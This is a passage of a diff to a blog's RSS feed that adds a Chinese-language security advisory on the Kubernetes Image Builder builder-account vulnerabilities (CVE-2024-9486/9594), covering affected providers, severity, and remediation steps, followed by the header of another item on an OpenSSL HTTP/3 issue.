+&lt;li&gt;镜像构建完成后强制禁用builder账户&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;cve-2024-9594&#34;&gt;CVE-2024-9594
+&lt;/h4&gt;&lt;p&gt;此漏洞与CVE-2024-9486类似，但影响Nutanix/OVA/QEMU/raw提供商。关键区别在于：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;仅能在镜像部署周期内被利用&lt;/li&gt;
+&lt;li&gt;无法在构建完成后维持访问
+因此其CVSS评分较低（6.3）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;临时缓解&lt;/strong&gt;：在受影响虚拟机上禁用builder账户&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;彻底修复&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;使用已修复的Image Builder v0.1.38重建镜像&lt;/li&gt;
+&lt;li&gt;重新部署所有受影响虚拟机&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;威胁现状&#34;&gt;威胁现状
+&lt;/h3&gt;&lt;p&gt;Kudelski安全团队尚未监测到这些漏洞的主动利用行为，将持续跟踪相关动态。&lt;/p&gt;
+&lt;h3 id=&#34;参考链接&#34;&gt;参考链接
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://thehackernews.com/2024/10/critical-kubernetes-image-builder.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Hacker News相关报道&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
         <title>OpenSSL HTTP/3漏洞分析：CURLINFO_TLS_SSL_PTR指针错误导致的潜在RCE风险</title>
         <link>http://localhost:1313/p/openssl-http/3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90curlinfo_tls_ssl_ptr%E6%8C%87%E9%92%88%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BD%9C%E5%9C%A8rce%E9%A3%8E%E9%99%A9/</link>
         <pubDate>Sun, 03 Aug 2025 09:39:47 +0800</pubDate>
